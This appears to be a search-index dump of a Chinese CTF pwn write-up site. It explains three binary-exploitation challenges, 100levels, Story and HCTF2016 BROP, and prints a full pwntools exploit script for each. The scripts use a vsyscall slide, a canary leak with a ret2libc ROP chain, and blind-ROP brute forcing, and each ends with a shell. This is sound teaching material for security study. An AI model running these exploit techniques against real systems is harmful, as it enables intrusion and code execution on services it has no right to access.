\u7136\u540e\u6211\u4eec\u56de\u5fc6\u4e0b\u7a0b\u5e8f\u7684\u8c03\u7528\u6d41\u7a0b\uff0c\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u8fd9\u6837\u8c03\u7528\uff1amenu- call hint()- ret menu- call game() \u8fd9\u6837\u4e00\u6765\uff0cgame\u4e0ehint\u7684\u6808\u5e27\u5c06\u4e00\u6837\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cgame\u6a21\u5757\u7684rbp+110\u504f\u79fb\u5904\u7684\u503c\u5c06\u4f1a\u662fhint\u6a21\u5757\u7684rbp+110\u504f\u79fb\u5904\u7684\u503c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0csystem\u51fd\u6570\u7684\u5730\u5740\u5c06\u88ab\u56fa\u5b9a\u5728game\u6a21\u5757\u7684\u6808\u4e2d\uff01\uff01\u8fd9\u5c31\u5f88\u597d\u4e86\uff0c\u56e0\u4e3a\u867d\u7136hint\u6a21\u5757\u6ca1\u6709\u518d\u6b21\u8c03\u7528\u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u6ca1\u6709\u529e\u6cd5\u901a\u8fc7\u6808\u6ea2\u51faret\u5230system\u51fd\u6570\u7684\u4f4d\u7f6e\uff0c\u4f46\u662fgame\u6a21\u5757\u8c03\u7528\u4e86play()\u51fd\u6570\uff0c\u800c\u4e14play\u51fd\u6570\u4e2d\u6709\u6808\u6ea2\u51fa\u7684\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528 \u3002 \u7136\u540e\u63a5\u4e0b\u6765\u7684\u95ee\u9898\u5c31\u53d8\u6210\u4e86\u600e\u4e48\u5229\u7528\u8fd9\u4e2a\u6808\u4e0a\u7684system\u51fd\u6570\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u60f3\u5230\u7cfb\u7edf\u6ed1\u677f\u3002 \u5148\u628a\u8fd9\u4e2a\u6808\u4e0a\u7684\u5927\u6982\u5185\u5bb9\u6574\u7406\u4e00\u4e0b \u521d\u6b65\u7684\u60f3\u6cd5\u662f\u76f4\u63a5\u8fd4\u56de\u5230system\u51fd\u6570\u5904\uff0c\u4f46\u662f\u8fd9\u4e2asystem\u51fd\u6570\u5e76\u4e0d\u5728play\u51fd\u6570\u7684ret\u5904\uff0c\u6240\u4ee5\u9700\u8981\u501f\u52a9\u4e00\u4e2a\u6ed1\u677f\u6ed1\u5230sys_addr\u5904\u3002\u8fd9\u91cc\u5c31\u53ef\u4ee5\u7528\u5230vsyscall()\u6765\u5145\u5f53\u8fd9\u4e2a\u6ed1\u677f\u3002 \u73b0\u4ee3\u7684Windows/*Unix\u64cd\u4f5c\u7cfb\u7edf\u90fd\u91c7\u7528\u4e86\u5206\u7ea7\u4fdd\u62a4\u7684\u65b9\u5f0f\uff0c\u5185\u6838\u4ee3\u7801\u4f4d\u4e8eR0\uff0c\u7528\u6237\u4ee3\u7801\u4f4d\u4e8eR3\u3002\u8bb8\u591a\u5bf9\u786c\u4ef6\u548c\u5185\u6838\u7b49\u7684\u64cd\u4f5c\u90fd\u4f1a\u88ab\u5305\u88c5\u6210\u5185\u6838\u51fd\u6570\u5e76\u63d0\u4f9b\u4e00\u4e2a\u63a5\u53e3\u7ed9\u7528\u6237\u5c42\u4ee3\u7801\u8c03\u7528\uff0c\u8fd9\u4e2a\u63a5\u53e3\u5c31\u662f\u6211\u4eec\u719f\u77e5\u7684int 0x80/syscall+\u8c03\u7528\u53f7\u6a21\u5f0f\u3002\u5f53\u6211\u4eec\u6bcf\u6b21\u8c03\u7528\u8fd9\u4e2a\u63a5\u53e3\u65f6\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u9694\u79bb\uff0c\u6211\u4eec\u9700\u8981\u628a\u5f53\u524d\u7684\u4e0a\u4e0b\u6587(\u5bc4\u5b58\u5668\u72b6\u6001\u7b49)\u4fdd\u5b58\u597d\uff0c\u7136\u540e\u5207\u6362\u5230\u5185\u6838\u6001\u8fd0\u884c\u5185\u6838\u51fd\u6570\uff0c\u7136\u540e\u5c06\u5185\u6838\u51fd\u6570\u8fd4\u56de\u7684\u7ed3\u679c\u653e\u7f6e\u5230\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u548c\u5185\u5b58\u4e2d\uff0c\u518d\u6062\u590d\u4e0a\u4e0b\u6587\uff0c\u5207\u6362\u5230\u7528\u6237\u6a21\u5f0f\u3002\u8fd9\u4e00\u8fc7\u7a0b\u9700\u8981\u8017\u8d39\u4e00\u5b9a\u7684\u6027\u80fd\u3002\u5bf9\u4e8e\u67d0\u4e9b\u7cfb\u7edf\u8c03\u7528\uff0c\u5982gettimeofday\u6765\u8bf4\uff0c\u7531\u4e8e\u4ed6\u4eec\u7ecf\u5e38\u88ab\u8c03\u7528\uff0c\u5982\u679c\u6bcf\u6b21\u88ab\u8c03\u7528\u90fd\u8981\u8fd9\u4e48\u6765\u56de\u6298\u817e\u4e00\u904d\uff0c\u5f00\u9500\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u7d2f\u8d58\u3002\u56e0\u6b64\u7cfb\u7edf\u628a\u51e0\u4e2a\u5e38\u7528\u7684\u65e0\u53c2\u5185\u6838\u8c03\u7528\u4ece\u5185\u6838\u4e2d\u6620\u5c04\u5230\u7528\u6237\u7a7a\u95f4\u4e2d\uff0c\u8fd9\u5c31\u662fvsyscall\u3002 vsyscall\u7684\u5730\u5740\u5e76\u4e0d\u53d7PIE\u7684\u5f71\u54cd\uff0c\u59cb\u7ec8\u57280xffffffffff600000-0xffffffffff601000\u5904\uff0c\u800c\u4e14\u603b\u5171\u6709\u4e09\u4e2a\uff0c\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u5206\u522b\u662fgettimeofday, time\u548cgetcpu\u3002 \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cvsyscall\u6267\u884c\u65f6\u4f1a\u8fdb\u884c\u68c0\u67e5\uff0c\u5982\u679c\u4e0d\u662f\u4ece\u51fd\u6570\u5f00\u5934\u6267\u884c\u7684\u8bdd\u5c31\u4f1a\u51fa\u9519\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u552f\u4e00\u7684\u9009\u62e9\u5c31\u662f\u5229\u75280xffffffffff600000, 0xffffffffff600400, 0xffffffffff600800\u8fd9\u4e09\u4e2a\u5730\u5740\u3002\u56e0\u4e3a\u8fd9\u4e09\u4e2a\u4f4d\u7f6e\u662f\u6b7b\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u7528\u8fd9\u4e09\u4e2a\u6765\u505a\u6ed1\u677f\uff0c\u6ed1\u5230sysaddr\u90a3\u91cc\u3002 \u5206\u6790\u6808\u5e03\u5c40\uff0c\u6784\u9020\u6211\u4eec\u7684exp\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\uff0c\u6211\u4eec\u8fd9\u6837\u76f8\u5f53\u4e8e\u4f1a\u628asys_addr\u548c\u7b2c\u4e8c\u6b21\u8f93\u5165\u7684\u503c\u76f8\u52a0\u5f97\u5230\u6700\u7ec8\u7684\u5173\u5361\u6570\uff0c\u4e0a\u9650\u662f100\u3002\u6240\u4ee5\u6211\u4eec\u540e\u9762\u8fd8\u8981\u5b8c\u621099\u6b21\u7684\u7b54\u9898\uff0c\u7136\u540e\u5728\u6700\u540e\u4e00\u6b21\u5b9e\u73b0\u6808\u6ea2\u51fa\u3002\u4f46\u662f\u8fd8\u6709\u4e00\u70b9\u5c31\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u53ea\u6709system\u7684\u5730\u5740\uff0c\u8fd8\u6ca1\u6709\u653e\u597d\u53c2\u6570\u3002\u4f46\u662f\u60f3\u8981\u653e\u597d\u53c2\u6570\u6709\u9700\u8981\u76f4\u5230\u7a0b\u5e8f\u7684\u52a0\u8f7d\u5730\u5740\uff0c\u4ee5\u6784\u9020ROP\u94fe\u3002\u6240\u4ee5\u6211\u4eec\u5e72\u8106\u4e0d\u8c03\u7528system\u51fd\u6570\uff0c\u76f4\u63a5\u8c03\u7528libc\u4e2d\u7684one_gadget\u3002\u6240\u4ee5\u8fd8\u9700\u8981\u8ba1\u7b97system\u51fd\u6570\u7684\u5730\u5740\u548cone_gadget\u7684\u5730\u5740\u4e4b\u5dee\uff0c\u7136\u540e\u4ee4\u5176\u52a0\u548c\u3002 \u6700\u540e\u5199\u51faexp from pwn import * context . log_level = True p = process ( ./100levels ) #p = remote( 111.198.29.45 , 53167) elf = ELF ( ./100levels ) one_gadget = 0x45216 sys_addr = 0x45390 offset = one_gadget - sys_addr vsys_addr = 0xffffffffff600007 def hint (): print p . recvuntil ( Choice: \\n ) p . sendline ( 2 ) print p . recvuntil ( NO PWN NO FUN \\n ) def play (): print p . recvuntil ( Question: ) a = p . recvuntil ( ) a = a [: - 1 ] a = int ( a , 10 ) print p . recvuntil ( * ) b = p . recvuntil ( ) b = b [: - 1 ] b = int ( b , 10 ) print p . recvuntil ( Answer: ) p . sendline ( str ( a * b )) def boom (): payload = a * 0x30 + a * 8 + p64 ( vsys_addr ) * 3 print p . recvuntil ( Answer: ) p . send ( payload ) def game (): print p . recvuntil ( Choice: \\n ) p . sendline ( 1 ) print p . recvuntil ( How many levels? \\n ) p . sendline ( -1 ) print p . recvuntil ( Any more? \\n ) p . sendline ( str ( offset )) print p . recvuntil ( Let s go! \\n ) for i in range ( 99 ): play () boom () p . interactive () if __name__ == __main__ : hint () game ()","title":"100levels WP"},{"location":"pwn/Stackoverflow/Story/","text":"Story \u897f\u6e56\u8bba\u52512018 Stack_overflow ROP \u5206\u6790 \u9996\u5148\uff0c\u5224\u65ad\u7a0b\u5e8f\u7684\u4fdd\u62a4\u3002\u53d1\u73b0\u6808\u4e0a\u6709Canary\uff0c\u5c1d\u8bd5\u6cc4\u9732\u3002 **\u7b2c\u4e00\u4e2a\u6d1e\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002**\u5728\u9759\u6001\u5206\u6790\u4e2d\u770b\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5c1d\u8bd5\u901a\u8fc7\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u6cc4\u9732\u3002\u901a\u8fc7\u642d\u914dgdb\uff0c\u786e\u5b9aCanary\u7684\u4f4d\u7f6e\uff0864\u4f4d\u7684\u4f18\u5148\u7ea7\u4e0e32\u4f4d\u4e0d\u540c\uff0c64\u4f4d\u4f1a\u4f18\u5148\u8003\u86516\u4e2a\u5bc4\u5b58\u5668\uff0c\u968f\u540e\u518d\u5bf9\u6808\u8fdb\u884c\u8003\u8651\u3002\uff09\u4e3a\u7b2c23\u4e2a\u53c2\u6570\uff0c\u56e0\u6b64\u901a\u8fc7 %23$p \u6cc4\u9732Canary\u7684\u4f4d\u7f6e\u3002 **\u7b2c\u4e8c\u4e2a\u6d1e\uff1a\u6808\u6ea2\u51fa\u3002**\u5728\u8f93\u5165\u201c\u8f93\u5165\u5b57\u7b26\u4e32\u957f\u5ea6\u201d\u4e4b\u540e\uff0c\u5982\u679c\u7533\u8bf7\u7684\u7a7a\u95f4\u5c0f\u4e8e128\uff0c\u4f1a\u81ea\u52a8\u7ed9\u5f001024\u5927\u5c0f\u3002\u7136\u540e\u8bfb\u53d6\u5b57\u7b26\u4e32\u5230s\u4e2d\uff0c\u800cs\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e\u4e3a0x90\uff0c\u56e0\u6b64\u901a\u8fc7\u6784\u9020\u5b57\u7b26\u4e32\u53ef\u89e6\u53d1\u6808\u6ea2\u51fa\u3002\u800c\u4e4b\u524d\u901a\u8fc7\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u83b7\u53d6\u5230\u4e86Canary\u7684\u5927\u5c0f\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u7528\u5230\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8986\u76d6 $$ 0x90-0x8=0x88 $$ \u4e2aA\u81f3Canary\uff0c\u7136\u540e\u5c06\u4e4b\u524d\u6cc4\u9732\u7684Canary\u503c\u8986\u76d6\u81f3\u6b64\uff0c\u7136\u540e\u901a\u8fc78\u4e2a\u5b57\u7b26A\u8986\u76d6\u8fd4\u56de\u503c\uff0c\u4e4b\u540e\u5373\u53ef\u63a7\u5236\u4e0b\u4e00\u6b65\u6267\u884c\u7684\u51fd\u6570\u3002 \u901a\u8fc7ROPgadget\u627e\u5230\u5176\u4e2d\u7684ROP\u5173\u952e\u5b57 pop rdi ; ret \u6765\u5c06\u51fd\u6570\u53c2\u6570\u5165\u5bc4\u5b58\u5668\u3002 \u901a\u8fc7\u8c03\u7528put\u51fd\u6570\u5c06got\u8868\u4e2d\u7684put\u8f93\u51fa\uff0c\u5373\u53ef\u83b7\u53d6put\u7684\u5b9e\u9645\u4f4d\u7f6e\uff0c\u4ece\u800c\u8ba1\u7b97\u51falibc\u7684\u504f\u79fb\u3002\u5728\u89e6\u53d1\u4e4b\u540e\uff0c\u901a\u8fc7ret\u5230main\u51fd\u6570\u5730\u5740\u6765\u91cd\u65b0\u89e6\u53d1\u6808\u6ea2\u51fa\uff0c\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u51fasystem\u548c/bin/sh\u7684\u5730\u5740\uff0c\u83b7\u53d6\u6743\u9650\u3002 EXP import pwn from pwn import * p = process ( ./story ) #p = remote( ctf3.linkedbyx.com ,11375) context . log_level = debug context . endian = little elf = ELF ( ./story ) libc = ELF ( /lib/x86_64-linux-gnu/libc.so.6 ) payload1 = %23$p payload2 = -1024 puts_plt = elf . symbols [ puts ] puts_got = elf . got [ puts ] start_main = 0x400876 rdi = 0x400bd3 #pop rdi ; ret p . recvuntil ( Please Tell Your ID: ) p . sendline ( payload1 ) p . recvuntil ( Hello ) canary = int ( p . recvuntil ( \\n ), 16 ) print hex ( canary ) print hex ( puts_plt ) print hex ( puts_got ) print hex ( rdi ) p . recvuntil ( Tell me the size of your story: \\n ) p . sendline ( payload2 ) p . recvuntil ( You can speak your story: \\n ) payload3 = A * 136 payload3 += p64 ( canary ) payload3 += A * 8 payload3 += p64 ( rdi ) payload3 += p64 ( puts_got ) payload3 += p64 ( puts_plt ) payload3 += p64 ( start_main ) p . sendline ( payload3 ) data = p . recvuntil ( \\n , drop = True ) puts = u64 ( data . ljust ( 8 , \\x00 )) print hex ( puts ) print puts system_addr = puts - libc . symbols [ puts ] + libc . symbols [ system ] print hex ( system_addr ) p . recvuntil ( Please Tell Your ID: ) p . sendline ( payload1 ) p . recvuntil ( Tell me the size of your story: \\n ) p . sendline ( payload2 ) binsh = next ( libc . search ( /bin/sh )) binsh_addr = puts - libc . symbols [ puts ] + binsh print hex ( binsh_addr ) payload4 = A * 136 payload4 += p64 ( canary ) payload4 += A * 8 payload4 += p64 ( rdi ) payload4 += p64 ( binsh_addr ) payload4 += p64 ( system_addr ) p . recvuntil ( You can speak your story: \\n ) p . sendline ( payload4 ) p . interactive ()","title":"Story"},{"location":"pwn/Stackoverflow/Story/#story","text":"\u897f\u6e56\u8bba\u52512018 Stack_overflow ROP","title":"Story"},{"location":"pwn/Stackoverflow/Story/#_1","text":"\u9996\u5148\uff0c\u5224\u65ad\u7a0b\u5e8f\u7684\u4fdd\u62a4\u3002\u53d1\u73b0\u6808\u4e0a\u6709Canary\uff0c\u5c1d\u8bd5\u6cc4\u9732\u3002 **\u7b2c\u4e00\u4e2a\u6d1e\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3002**\u5728\u9759\u6001\u5206\u6790\u4e2d\u770b\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u5c1d\u8bd5\u901a\u8fc7\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fdb\u884c\u6cc4\u9732\u3002\u901a\u8fc7\u642d\u914dgdb\uff0c\u786e\u5b9aCanary\u7684\u4f4d\u7f6e\uff0864\u4f4d\u7684\u4f18\u5148\u7ea7\u4e0e32\u4f4d\u4e0d\u540c\uff0c64\u4f4d\u4f1a\u4f18\u5148\u8003\u86516\u4e2a\u5bc4\u5b58\u5668\uff0c\u968f\u540e\u518d\u5bf9\u6808\u8fdb\u884c\u8003\u8651\u3002\uff09\u4e3a\u7b2c23\u4e2a\u53c2\u6570\uff0c\u56e0\u6b64\u901a\u8fc7 %23$p \u6cc4\u9732Canary\u7684\u4f4d\u7f6e\u3002 **\u7b2c\u4e8c\u4e2a\u6d1e\uff1a\u6808\u6ea2\u51fa\u3002**\u5728\u8f93\u5165\u201c\u8f93\u5165\u5b57\u7b26\u4e32\u957f\u5ea6\u201d\u4e4b\u540e\uff0c\u5982\u679c\u7533\u8bf7\u7684\u7a7a\u95f4\u5c0f\u4e8e128\uff0c\u4f1a\u81ea\u52a8\u7ed9\u5f001024\u5927\u5c0f\u3002\u7136\u540e\u8bfb\u53d6\u5b57\u7b26\u4e32\u5230s\u4e2d\uff0c\u800cs\u5728\u6808\u4e2d\u7684\u4f4d\u7f6e\u4e3a0x90\uff0c\u56e0\u6b64\u901a\u8fc7\u6784\u9020\u5b57\u7b26\u4e32\u53ef\u89e6\u53d1\u6808\u6ea2\u51fa\u3002\u800c\u4e4b\u524d\u901a\u8fc7\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u83b7\u53d6\u5230\u4e86Canary\u7684\u5927\u5c0f\uff0c\u53ef\u4ee5\u5728\u8fd9\u91cc\u7528\u5230\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8986\u76d6 $$ 0x90-0x8=0x88 $$ \u4e2aA\u81f3Canary\uff0c\u7136\u540e\u5c06\u4e4b\u524d\u6cc4\u9732\u7684Canary\u503c\u8986\u76d6\u81f3\u6b64\uff0c\u7136\u540e\u901a\u8fc78\u4e2a\u5b57\u7b26A\u8986\u76d6\u8fd4\u56de\u503c\uff0c\u4e4b\u540e\u5373\u53ef\u63a7\u5236\u4e0b\u4e00\u6b65\u6267\u884c\u7684\u51fd\u6570\u3002 \u901a\u8fc7ROPgadget\u627e\u5230\u5176\u4e2d\u7684ROP\u5173\u952e\u5b57 pop rdi ; ret \u6765\u5c06\u51fd\u6570\u53c2\u6570\u5165\u5bc4\u5b58\u5668\u3002 \u901a\u8fc7\u8c03\u7528put\u51fd\u6570\u5c06got\u8868\u4e2d\u7684put\u8f93\u51fa\uff0c\u5373\u53ef\u83b7\u53d6put\u7684\u5b9e\u9645\u4f4d\u7f6e\uff0c\u4ece\u800c\u8ba1\u7b97\u51falibc\u7684\u504f\u79fb\u3002\u5728\u89e6\u53d1\u4e4b\u540e\uff0c\u901a\u8fc7ret\u5230main\u51fd\u6570\u5730\u5740\u6765\u91cd\u65b0\u89e6\u53d1\u6808\u6ea2\u51fa\uff0c\u901a\u8fc7\u504f\u79fb\u8ba1\u7b97\u51fasystem\u548c/bin/sh\u7684\u5730\u5740\uff0c\u83b7\u53d6\u6743\u9650\u3002","title":"\u5206\u6790"},{"location":"pwn/Stackoverflow/Story/#exp","text":"import pwn from pwn import * p = process ( ./story ) #p = remote( ctf3.linkedbyx.com ,11375) context . log_level = debug context . endian = little elf = ELF ( ./story ) libc = ELF ( /lib/x86_64-linux-gnu/libc.so.6 ) payload1 = %23$p payload2 = -1024 puts_plt = elf . symbols [ puts ] puts_got = elf . got [ puts ] start_main = 0x400876 rdi = 0x400bd3 #pop rdi ; ret p . recvuntil ( Please Tell Your ID: ) p . sendline ( payload1 ) p . recvuntil ( Hello ) canary = int ( p . recvuntil ( \\n ), 16 ) print hex ( canary ) print hex ( puts_plt ) print hex ( puts_got ) print hex ( rdi ) p . recvuntil ( Tell me the size of your story: \\n ) p . sendline ( payload2 ) p . recvuntil ( You can speak your story: \\n ) payload3 = A * 136 payload3 += p64 ( canary ) payload3 += A * 8 payload3 += p64 ( rdi ) payload3 += p64 ( puts_got ) payload3 += p64 ( puts_plt ) payload3 += p64 ( start_main ) p . sendline ( payload3 ) data = p . recvuntil ( \\n , drop = True ) puts = u64 ( data . ljust ( 8 , \\x00 )) print hex ( puts ) print puts system_addr = puts - libc . symbols [ puts ] + libc . symbols [ system ] print hex ( system_addr ) p . recvuntil ( Please Tell Your ID: ) p . sendline ( payload1 ) p . recvuntil ( Tell me the size of your story: \\n ) p . sendline ( payload2 ) binsh = next ( libc . search ( /bin/sh )) binsh_addr = puts - libc . symbols [ puts ] + binsh print hex ( binsh_addr ) payload4 = A * 136 payload4 += p64 ( canary ) payload4 += A * 8 payload4 += p64 ( rdi ) payload4 += p64 ( binsh_addr ) payload4 += p64 ( system_addr ) p . recvuntil ( You can speak your story: \\n ) p . sendline ( payload4 ) p . interactive ()","title":"EXP"},{"location":"pwn/Stackoverflow/brop/","text":"HCTF2016-BROP \u9898\u76ee\u5e76\u6ca1\u6709\u7ed9\u539f\u6587\u4ef6\uff0c\u90a3\u4e48\u5c31\u5fc5\u987b\u91c7\u53d6\u7206\u7834\u7684\u65b9\u5f0f\u5c06\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u90fd\u7ed9\u731c\u51fa\u6765\u3002 \u89e3\u9898\u5927\u6982\u601d\u8def\uff1a 1\u3001\u6c42\u51fa\u6808\u6ea2\u51fa\u7684\u504f\u79fb\u3002 2\u3001\u6c42\u51fa\u4e00\u4e2a\u6b63\u5e38\u8fd4\u56de\u5230main\u7684\u51fd\u6570\u4f4d\u7f6e\u3002\uff08\u6765\u5224\u65ad\u4e0b\u9762\u7a77\u4e3e\u65f6\u7684\u4ee3\u7801\uff09\u3002 3\u3001\u56e0\u4e3a__libc_csu_init\u4e00\u822c\u90fd\u4f1a\u7528\u5230\uff0c\u5176\u4e2d\u7684\u901a\u7528gadgets\u5728\u7a0b\u5e8f\u7684\u5176\u4ed6\u4f4d\u7f6e\u4e2d\u4e5f\u5e76\u4e0d\u5e38\u89c1\uff0c\u56e0\u6b64\u4e5f\u5c06\u5176\u4f5c\u4e3a\u731c\u89e3\u7684\u76ee\u6807\u3002\u6c42\u51fa\u901a\u7528gadgets\u7684\u4f4d\u7f6e\u3002 4\u3001\u786e\u5b9aput\u51fd\u6570\u7684\u4f4d\u7f6e\u3002 5\u3001\u5f97\u5230put\u51fd\u6570\u4e4b\u540e\u5c06\u524d\u9762\u7684\u6587\u4ef6dump\u4e0b\u6765\uff0c\u6c42\u51fagot\u8868\u4e2d\u7684\u4f4d\u7f6e\uff0c\u518d\u6c42\u51fa\u52a0\u8f7d\u7684\u5b9e\u9645\u4f4d\u7f6e\u3002 6\u3001\u786e\u5b9alibc\uff0c\u6c42\u51fasystem\u51fd\u6570\u548c/bin/sh\u7684\u4f4d\u7f6e\u3002 7\u3001\u5229\u7528\u3002 ps:\u5982\u679c\u5b58\u5728canary\uff0ccanary\u5728\u7a0b\u5e8f\u91cd\u542f\u540e\u4e0d\u53d8\uff0c\u90a3\u4e48\u53ef\u4ee5\u6309\u5b57\u8282\u5bf9canary\u8fdb\u884c\u7206\u7834\u3002\u6bd4\u5982\u5148\u5c1d\u8bd5\u6539\u53d8\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u7a0b\u5e8f\u4e0d\u80fd\u7ee7\u7eed\u8dd1\u8d77\u6765\uff0c\u5c31\u8bf4\u660e\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0d\u5bf9\uff0c\u5982\u679c\u7a0b\u5e8f\u80fd\u8dd1\u8d77\u6765\uff0c\u5c31\u8bf4\u660e\u7b2c\u4e00\u4e2a\u5b57\u8282\u6b63\u786e\uff0c\u7ee7\u7eed\u8dd1\u4e0b\u4e00\u4e2a\u5b57\u8282 \u6c42\u6808\u6ea2\u51fa\u7684\u504f\u79fb def search_offset(): i = 1 while 1: try: sh = remote( 127.0.0.1 ,9999) sh.recvuntil( WelCome my friend,Do you know password?\\n ) payload = i * a sh.send(payload) output = sh.recv() sh.close() i = i + 1 except Exception: sh.close() return i - 1 \u6c42\u51fa\u4e00\u4e2a\u53ef\u4ee5\u6b63\u5e38\u8fd4\u56de\u5230main\u51fd\u6570\u7684\u5730\u5740 def stop_gadgets(): #addr = 0x4006b2 addr = 0x400000 while 1: try: sh = remote( 127.0.0.1 ,9999) payload = a * 72 payload += p64(addr) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) sh.recv() sh.close() print the addr is :0x%x % (addr) break except Exception: addr = addr + 1 sh.close() \u6c42\u51fa\u901a\u7528gadgets\u7684\u4f4d\u7f6e\uff0c\u4e3a\u4e86\u4e0e\u8fd4\u56de\u5230main\u51fd\u6570\u7684gadget\u4f5c\u533a\u5206\uff0c\u8fd8\u8981\u505a\u4e00\u4e2a\u5224\u65ad def find_brop_gadgets(): addr = 0x4007b0 while 1: try: sh = remote( 127.0.0.1 ,9999) payload = a * 72 payload += p64(addr) payload += p64(1) * 6 payload += p64(stop_gadget) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) sh.recv() sh.close() print the addr is :0x%x % (addr) return addr except Exception: addr = addr + 1 sh.close() def check_brop_gadgets(): print hex(addr) try: sh = remote( 127.0.0.1 ,9999) payload = a * 72 payload += p64(addr) + p64(1)*7 sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) sh.recv() sh.close() print false except Exception: print true \u786e\u5b9aput\u51fd\u6570\u5728plt\u4e2d\u7684\u4f4d\u7f6e def find_put_plt(): addr = 0x400550 while 1: try: payload = 72 * a payload += p64(brop_gadget+9) payload += p64(0x400000) payload += p64(addr) payload += p64(stop_gadget) sh = remote( 127.0.0.1 ,9999) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.sendline(payload) output = sh.recv() sh.close() if output.startswith( \\x7fELF ): print the addr is :0x%x % (addr) return addr else: addr = addr + 1 except Exception: sh.close() addr = addr + 1 \u8fd9\u91cc\u5b58\u5728\u4e24\u4e2a\u77e5\u8bc6\u70b9\u3002 1\u3001\u6307\u5411 pop r15\u7684\u5730\u5740\u518d\u5f80\u540e\u4e00\u4e2a\u5b57\u8282\u5c31\u53ef\u4ee5\u53d8\u6210 pop rdi \u5177\u4f53\u53ef\u4ee5\u770b\u4e00\u4e0b\u4e24\u6761\u6c47\u7f16\u6307\u4ee4\u7684\u673a\u5668\u7801 pop r15 \u5728brop_gadgets+8\u5904\uff0c\u56e0\u6b64 pop rdi\u5728brop_gadgets+9\u5904 \u540c\u7406\u4e5f\u53ef\u4ee5\u63a7\u5236rsi 2\u3001\u6c42\u51fa\u6765\u7684put\u5730\u5740\u662f 0x400555\uff0c\u4f46\u5176\u5b9eput\u51fd\u6570\u5728plt\u4e2d\u7684\u5b9e\u9645\u4f4d\u7f6e\u662f0x400560\uff0c\u5f53\u7136\u4f7f\u7528\u6c42\u51fa\u6765\u7684\u5730\u5740\u4e5f\u65e0\u6240\u8c13 \u5229\u7528put\u51fd\u6570\u628a\u4e8c\u8fdb\u5236\u6587\u4ef6dump\u4e0b\u6765\uff0c\u4ece\u800c\u627e\u5230put\u51fd\u6570\u5728got\u8868\u4e2d\u7684\u5730\u5740 def leak(): addr = 0x400000 result = while (addr 0x400700): payload = 72 * a payload += p64(brop_gadget+9) payload += p64(addr) payload += p64(put_gadget) payload += p64(stop_gadget) sh = remote( 127.0.0.1 ,9999) sh.recvuntil( WelCome my friend,Do you know password?\\n ) sh.send(payload) try: data = sh.recv() sh.close() try: data = data[:data.index( \\nWelCome )] except Exception: data = data if (data == ): data = \\x00 except Exception: sh.close() continue; result += data addr = addr + len(data) with open( leak_code , wb ) as f: f.write(result) print success \u5229\u7528ida\u67e5\u770b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5f97\u5230\u5730\u5740 \u53ef\u4ee5\u770b\u5230 put\u5728got\u8868\u4e2d\u7684\u5730\u5740\u4e3a0x601018 \u7136\u540e\u627e\u5230\u5bf9\u5e94\u7684libc\u5e93 \uff0c\u5229\u7528\u504f\u79fb\u627e\u5230\u771f\u6b63\u7684system\u5730\u5740\u548c/bin/sh\u5730\u5740\uff0c\u5728\u8fdb\u884c\u5229\u7528 sys_addr = 0 bin_addr = 0 offset = 72 brop_gadget = 0x4007ba stop_gadget = 0x4006b6 put_gadget = 0x400555 put_got = 0x601018 payload = a * 72 payload += p64(brop_gadget+9) payload += p64(put_got) payload += p64(put_gadget) payload += p64(stop_gadget) sh = remote( 127.0.0.1 ,9999) sh.recvuntil( password?\\n ) sh.sendline(payload) data = sh.recv() put_addr = u64(data.ljust(8, \\x00 )) libc = LibcSearcher( puts ,put_addr) libc_base = put_addr - libc.dump( puts ) sys_addr = libc_base + libc.dump( system ) bin_addr = libc_base + libc.dump( str_bin_sh ) #addr = find_brop_gadgets() payload = a * 72 payload += p64(brop_gadget+9) payload += p64(bin_addr) payload += p64(sys_addr) payload += p64(stop_gadget) sh.recvuntil( password?\\n ) sh.sendline(payload) sh.interactive()","title":"brop"},{"location":"pwn/Stackoverflow/brop/#hctf2016-brop","text":"\u9898\u76ee\u5e76\u6ca1\u6709\u7ed9\u539f\u6587\u4ef6\uff0c\u90a3\u4e48\u5c31\u5fc5\u987b\u91c7\u53d6\u7206\u7834\u7684\u65b9\u5f0f\u5c06\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u90fd\u7ed9\u731c\u51fa\u6765\u3002 \u89e3\u9898\u5927\u6982\u601d\u8def\uff1a 1\u3001\u6c42\u51fa\u6808\u6ea2\u51fa\u7684\u504f\u79fb\u3002 